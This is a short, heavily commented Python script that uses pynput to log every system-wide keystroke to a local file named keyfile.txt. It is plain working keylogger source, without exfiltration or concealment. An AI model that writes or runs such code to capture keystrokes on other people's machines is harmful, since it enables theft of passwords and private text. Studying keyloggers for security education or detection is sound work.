# Import the keyboard module from the pynput library
from pynput import keyboard

# Define a function that will be called when a key is pressed
def keyPressed(key):
    # Print the key that was pressed
    print(str(key))
    
    # Open the log file in append mode
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Check if the key pressed is a special key (like Ctrl, Alt, etc.)
            if isinstance(key, keyboard.Key):
                # If it is, write the name of the key surrounded by angle brackets
                logKey.write('<' + key.name + '>')
            else:
                # If it's not a special key, it's a regular character key
                # Get the character associated with the key pressed
                char = key.char
                # Write the character to the log file
                logKey.write(char)

        # If an AttributeError occurs (which means the key doesn't have a char attribute)
        except AttributeError:
            # Write the string representation of the key to the log file
            logKey.write(str(key))
        # If any other exception occurs
        except Exception as e:
            # Print an error message with the exception
            print(f"Error getting char: {e}")
            

# Check if this script is being run directly (not being imported)
if __name__ == "__main__":
    # Create a Listener object that will call the keyPressed function when a key is pressed
    listener = keyboard.Listener(on_press = keyPressed)
    # Start the listener
    listener.start()
    # Wait for the user to press Enter before ending the script
    input()